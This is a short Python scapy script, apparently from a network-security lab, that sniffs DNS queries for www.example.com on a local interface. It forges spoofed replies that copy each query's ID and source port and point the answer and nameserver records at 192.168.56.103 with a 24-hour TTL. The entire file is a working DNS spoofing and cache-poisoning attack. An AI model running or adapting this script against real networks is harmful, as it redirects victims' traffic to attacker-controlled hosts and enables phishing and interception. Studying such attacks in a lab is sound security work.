#!/usr/bin/python

from scapy.all import *
import sys

while 1:
	#sniff for interface 
	print "Sniffing for DNS packets \n"
	dns_pack = sniff(iface = 'eth19',filter = "dst port 53",count = 1)

	if(dns_pack[0].haslayer(DNS)and dns_pack[0].getlayer(DNS).qr==0 and dns_pack[0].getlayer(DNS).qd.qclass==1 and dns_pack[0].getlayer(DNS).qd.qtype==1 and dns_pack[0].getlayer(DNS).qd.qname == 'www.example.com.'):
	
		#print "sniffed dns query at:",time	
		src_ip= dns_pack[0].getlayer(IP).src
		
		if(dns_pack[0].haslayer(TCP)):
			src_port = dns_pack[0].getlayer(TCP).sport 	
		elif(dns_pack[0].haslayer(UDP)):
			src_port = dns_pack[0].getlayer(UDP).sport 
		else:
			pass
	
		query_id = dns_pack[0].getlayer(DNS).id
		dns_server = dns_pack[0].getlayer(IP).dst
		query_name = dns_pack[0].getlayer(DNS).qd.qname 
		qdata_count = dns_pack[0].getlayer(DNS).qdcount		 
				 
		print ("Received query with src %s and dest %s and query id %s for %s \n"%(src_ip,dns_server,query_id, query_name))
	 	
		dns_spoof_resp = IP(src = dns_server,dst = src_ip)\
			/UDP(dport = src_port, sport = 53)\
			/DNS(id = query_id, qr=1, rd=0, ra=0, z=0,rcode=0, qdcount = qdata_count,ancount = 1, nscount=1, arcount=0,qd=DNSQR(qname='www.example.com',qtype=dns_pack[0].getlayer(DNS).qd.qtype,qclass=dns_pack[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname='www.example.com',rdata='192.168.56.103',ttl=86400),ns=DNSRR(rrname='ns.example.com',type=2,ttl=86400,rdata='192.168.56.103'),ar=DNSRR(rrname='www.example.com',rdata='192.168.56.103'))
				
		print "Sending spoofed DNS packet to %s",src_ip			
		send(dns_spoof_resp,iface ='eth19',count = 1)

		 


